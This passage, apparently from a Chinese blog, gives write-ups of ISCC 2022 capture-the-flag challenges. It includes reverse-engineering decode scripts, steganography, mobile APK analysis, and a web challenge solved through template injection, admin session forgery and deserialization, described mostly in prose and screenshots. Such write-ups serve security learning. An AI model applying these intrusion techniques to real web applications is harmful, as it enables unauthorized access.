number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="26"></td><td><pre>flag1 <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    flag <span class="token operator">+=</span> a<span class="token punctuation">[</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> a<span class="token punctuation">.</span>find<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">63</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="30"></td><td><pre>flag <span class="token operator">+=</span> <span class="token string">"="</span></pre></td></tr><tr><td data-num="31"></td><td><pre>flag <span class="token operator">=</span>jiema<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    flag1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> v17<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ISCC&#123;"</span><span class="token operator">+</span>flag1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523180552373.png" alt="image-20220523180552373"></p><h4 id="bobs-code"><a class="anchor" href="#bobs-code">#</a> Bob's Code</h4><p>查壳</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525151428988.png" alt="image-20220525151428988"></p><p>32 位拖到 ida 查看</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525151726644.png" alt="image-20220525151726644"></p><p>sub_41167c base64 编码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525151904056.png" alt="image-20220525151904056"></p><p>sub_411389base64 表</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525151938658.png" alt="image-20220525151938658"></p><p>sub_411023 是加点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525152036547.png" alt="image-20220525152036547"></p><p>sub_4116E0 字符串移动两位</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525152329282.png" alt="image-20220525152329282"></p><p>先将位移的过程逆回去</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span> </span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">".W1BqthGbfivMoNh3WMtqt.M9FoZtVc042AYzxgW1VoZputGBpVPRmeNlkoF0."</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">65</span> <span class="token operator">||</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token punctuation">&#123;</span>	 </pre></td></tr><tr><td data-num="9"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>				str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">24</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="13"></td><td><pre>			str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">24</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525153433300.png" alt="image-20220525153433300"></p><p>手工将第一个和 22 位两个点去了</p><p>U1ZorfEzdgtKmLf3UKrorK9DmXrTa042YWxveU1TmXnsrEZnTNPkcLjimD0.</p><p>然后是自定义 base64 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525160242588.png" alt="image-20220525160242588"></p><p>然后再 base64</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220525160013189.png" alt="image-20220525160013189"></p><h2 id="misc"><a class="anchor" href="#misc">#</a> MISC</h2><h4 id="2022冬奥会"><a class="anchor" href="#2022冬奥会">#</a> 2022 冬奥会</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519184605368.png" alt="image-20220519184605368"></p><p>这个提示另一只雪容融的原型是灯笼，修改图片长度</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523205055522.png" alt="image-20220523205055522"></p><p>解码得到如下信息，个人突破口还是雪容融</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523205300413.png" alt="image-20220523205300413"></p><p>这里将压缩包用 WinRAR 打开输入密码灯笼，解压出来一个 jpg 文件用 010Editor 打开</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185034297.png" alt="image-20220519185034297"></p><h4 id="单板小将苏翊鸣"><a class="anchor" href="#单板小将苏翊鸣">#</a> 单板小将苏翊鸣</h4><p>文件下载下来解压后</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185208759.png" alt="image-20220519185208759"></p><p>很明显这张图的高度不对，下面应该还有别的东西，用 010Editor 打开修改高度</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185357852.png" alt="image-20220519185357852"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185443800.png" alt="image-20220519185443800"></p><p>发现一张二维码，扫描得结果</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185636137.png" alt="image-20220519185636137"></p><p>发现编码信息，解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185748503.png" alt="image-20220519185748503"></p><p>看到提示信息</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519185908858.png" alt="image-20220519185908858"></p><p>则压缩包密码应该是 15942</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519190015979.png" alt="image-20220519190015979"></p><p>解压拿到 flag，（早知道就直接爆破文件密码了）</p><h4 id="隐秘的信息"><a class="anchor" href="#隐秘的信息">#</a> 隐秘的信息</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519190301822.png" alt="image-20220519190301822"></p><p>首先对题目给的 base 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519190418219.png" alt="image-20220519190418219"></p><p>暂时不知道这能干嘛，看到文件是加密的，我们拿到的信息只有这个吗，应该是密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519190640762.png" alt="image-20220519190640762"></p><p>解压得到这个图片，png 图片隐写，先用 010 打开前后数据块没发现可疑信息，用 png 隐写神器 Stegsolve 打开文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519191710066.png" alt="image-20220519191710066"></p><p>用这个通道打开发现数据不太一样，这是 16 进制，尝试转化成字符串</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220522121348107.png" alt="image-20220522121348107"></p><h4 id="降维打击"><a class="anchor" href="#降维打击">#</a> 降维打击</h4><p>这个题就给了一个图片，用 010 打开前后数据库没有有用信息，但是图片里还有一个 png 文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519193131337.png" alt="image-20220519193131337"></p><p>放到 kail 里用 foremost 分离一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519193452690.png" alt="image-20220519193452690"></p><p>又得到一个 png 图片，在 Stegsolve 里面各个通道没有找到有用的信息，可以用 zsteg 分离图片</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519194750167.png" alt="image-20220519194750167"></p><p>这里还有一个 png 文件，套娃，，</p><p>分离出这个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519194940717.png" alt="image-20220519194940717"></p><p>魔改的英文，去网上找魔女之女的对照表<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3Y4NzE1NTMz">《魔女之旅》文字破解・续 - 哔哩哔哩 (bilibili.com)</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519195143847.png" alt="image-20220519195143847"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519195257456.png" alt="image-20220519195257456"></p><p>然后全大写，每 4 个中间加一个中线</p><h4 id="藏在星空中的诗-1"><a class="anchor" href="#藏在星空中的诗-1">#</a> 藏在星空中的诗 - 1</h4><p>打开文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201028835.png" alt="image-20220519201028835"></p><p>很明显这个图是 ps 处理的，拖到在线 ps 工具里<span class="exturl" data-url="aHR0cHM6Ly9wcy5nYW9kaW5nLmNvbS8jLw==">【在线 PS】PS 软件网页版，ps 在线图片处理工具 photopea - 稿定设计 PS (gaoding.com)</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201351415.png" alt="image-20220519201351415"></p><p>将图层透明度更改后看到有个循序 13524</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201441954.png" alt="image-20220519201441954"></p><p>建议使用 winrar 因为 winrar 会将密码明文显示</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201632921.png" alt="image-20220519201632921"></p><p>打开得到密码对照表</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201705336.png" alt="image-20220519201705336"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201734279.png" alt="image-20220519201734279"></p><p xtfswvrmnntlcc="">将这个一一对照出来得到 flagISCC</p><h4 id="藏在星空中的诗-2"><a class="anchor" href="#藏在星空中的诗-2">#</a> 藏在星空中的诗 - 2</h4><p>一道组合题，那么前面的对照表还能在这继续用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519201938545.png" alt="image-20220519201938545"></p><p>这里对照出来后发现他的格式是 \QTTk 可以猜到这里是 Unicode 解码</p><p>将对应的字母 \u0049\u0053\u0043\u0043\u007B\u0040\u0034\u0073\u0035\u006d\u004f\u006d\u0028\u0075\u0045\u002a\u0041\u0055\u004E\u007D</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519203527616.png" alt="image-20220519203527616"></p><h4 id="真相只有一个"><a class="anchor" href="#真相只有一个">#</a> 真相只有一个</h4><p>打开 flag.txt 这个文件，对其全选的时候，发现有不可见字符</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519204032239.png" alt="image-20220519204032239"></p><p>现在判断可能是 sonw 隐写，现在去找解密的密码，用 stegsolve 打开文件，在通道中看到了密码，看来好像是一部分，剩下的爆破</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519204241873.png" alt="image-20220519204241873"></p><p>现在只能尝试去看看这个 stream 里面有什么东西了，用 010 打开发现</p><p>里面有个流量包</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519204619091.png" alt="image-20220519204619091"></p><p>将这个压缩包修复</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519204650069.png" alt="image-20220519204650069"></p><p>爆破密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519204750682.png" alt="image-20220519204750682"></p><p>得到了压缩包的密码 19981111，对其进行流量分析</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523142654587.png" alt="image-20220523142654587"></p><p>检查 UDP 流，发现 mp3 文件， 下一个页面就是音频，转化成原始数据，导出保存</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523142732502.png" alt="image-20220523142732502"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523142757057.png" alt="image-20220523142757057"></p><p>拖入 AU（Audacity）</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523215612112.png" alt="image-20220523215612112"></p><p>直接看最后一部分，应该是摩斯密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523215535188.png" alt="image-20220523215535188"></p><p>最终解析得到的如下</p><p>../.../-.-./-.-./--/../.../-.-./</p><p>最终的信息如下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519205104722.png" alt="image-20220519205104722"></p><p>拿到密码，用 snow 这个工具进行解密，根据使用文档，可以知道这条命令用于解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220519205246095.png" alt="image-20220519205246095"></p><h2 id="mobile"><a class="anchor" href="#mobile">#</a> MOBILE</h2><h4 id="mobilea"><a class="anchor" href="#mobilea">#</a> MobileA</h4><p>通过分析代码，发现 flag 分为俩部分</p><p>第一部分被 AES/CBC 模式加密（K@e2022%% y base64 编码后做密钥，I&amp;V2022*** base64 编码后做 IV），然后再 base64 编码，所以我们要先 base64 解码，然后 AES/CBC 模式解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204056185.png" alt="image-20220526204056185"></p><p>Base64 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204208211.png" alt="image-20220526204208211"></p><p>AES 解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204115322.png" alt="image-20220526204115322"></p><p>第一部分</p><p>[]vfgty78(*IUJ_</p><p>先进行 md5 加密，然后 base64 编码，最后打乱编码后的字符串，所以我们写还原字符串，然后 base64 解码，最后 md5 解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204244203.png" alt="image-20220526204244203"></p><p>修复字符串顺序</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205342282.png" alt="image-20220526205342282"></p><p>base64 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205720555.png" alt="image-20220526205720555"></p><p>最后 md5 解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205735276.png" alt="image-20220526205735276"></p><p>第二部分 flag</p><p>geometry</p><p []vfgty78(*iuj_geometry="">flag：ISCC</p><h2 id="擂台赛"><a class="anchor" href="#擂台赛">#</a> 擂台赛</h2><h3 id="web-2"><a class="anchor" href="#web-2">#</a> web</h3><h4 id="melody"><a class="anchor" href="#melody">#</a> Melody</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523132358975.png" alt="image-20220523132358975"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523132309953.png" alt="image-20220523132309953"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523132334892.png" alt="image-20220523132334892"></p><p>好像 admin 不能登录，但是别的可以</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523133759933.png" alt="image-20220523133759933"></p><p>随意登录的账号源码有提示说改用户没有获取 flag 的权限，很显然这里要伪造身份登录，先看看登录页面源码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523134137083.png" alt="image-20220523134137083"></p><p>看到这里还有一个 info，看看有没有什么信息</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523134238295.png" alt="image-20220523134238295"></p><p>更改 ua 头</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523134429953.png" alt="image-20220523134429953"></p><p>给了一个传参的值，这里发现有模板注入，可以读取 flash 的环境变量</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523135722275.png" alt="image-20220523135722275"></p><p>发现 session_key</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523135846975.png" alt="image-20220523135846975"></p><p>这里用脚本伪造 admin 的 session</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523141101872.png" alt="image-20220523141101872"></p><p>伪造 admin 登录，发现一个假的 falg</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523141344980.png" alt="image-20220523141344980"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523141413462.png" alt="image-20220523141413462"></p><p>源码部分看到一个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523141543280.png" alt="image-20220523141543280"></p><p>也不难，只要通过反序列化去覆盖 melody 模块变量，然后进入到 if 条件句，读取文件 flag.txt</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523142237418.png" alt="image-20220523142237418"></p><p>这里用 /therealflag 路由 post 方法传入</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220523142224292.png" alt="image-20220523142224292"></p><h3 id="mobile-2"><a class="anchor" href="#mobile-2">#</a> MOBILE</h3><h4 id="mobile-analysis"><a class="anchor" href="#mobile-analysis">#</a> Mobile Analysis</h4><p>可以看出 flag 分为三部分</p><p>![<img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526210104591.png" alt="image-20220526210104591"></p><p>先分析第一部分 C0541b.m2a，只是将 base64 编码后的字符串打乱位置，我们直接修复位置，然后 base64 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526210003326.png" alt="image-20220526210003326"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205951887.png" alt="image-20220526205951887"></p><p>第一段 flag</p><p>ISCC{displac</p><p>第二部分分析 C0540a.m4a，然后何 C0542c.m0a () 进行对比</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205910372.png" alt="image-20220526205910372"></p><p>直接可以爆破出，然后 base64 解码</p><p>第二段 flag</p><p>e_alternativ</p><p>第三段先 C0540a.m3b 加密，然后 AES/CBC 模式加密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205858784.png" alt="image-20220526205858784"></p><p>修复后 ZV9tb2JpbGV9，最后 base64 解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526205819591.png" alt="image-20220526205819591"></p><p>第三段 flag</p><p>e_mobile}</p><p displace_alternative_mobile="">flag：ISCC</p><h3 id="revese"><a class="anchor" href="#revese">#</a> REVESE</h3><h4 id="easyre"><a class="anchor" href="#easyre">#</a> Easyre</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203644152.png" alt="image-20220526203644152"></p><p>32 位无壳</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203657306.png" alt="img"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203714894.png" alt="image-20220526203714894"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203727419.png" alt="image-20220526203727419"></p><p>发现四处花指令，将 e8 改成 90 保存重新进入 ida</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203738935.png" alt="image-20220526203738935"></p><p>连续三个加密函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203900785.png" alt="image-20220526203900785"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203910168.png" alt="image-20220526203910168"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203922780.png" alt="image-20220526203922780"></p><p>每一个分别用 destination 前三位中三位后三位进行异或加密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203935498.png" alt="image-20220526203935498"></p><p>v11 是 flag</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"^&lt;L^&lt;LX:LX.MJ.MJ9PJ9VF$VF$T@$T];"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"enc!@#key"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220524210612534.png" alt="image-20220524210612534"></p><p>加上 iscc</p><p qwqqwqwqqwereerereeroiooioiooipp="">ISCC</p><h4 id="encode"><a class="anchor" href="#encode">#</a> Encode</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526203949173.png" alt="image-20220526203949173"></p><p>64 位无壳</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204001594.png" alt="image-20220526204001594"></p><p>Encode 为加密函数</p><p>前一部分是加减异或加密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204011659.png" alt="image-20220526204011659"></p><p>后一部分为 rsa 算法，用私钥加密公钥解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220526204018736.png" alt="image-20220526204018736"></p><p>算出 e = 37n = 77d = 37</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token 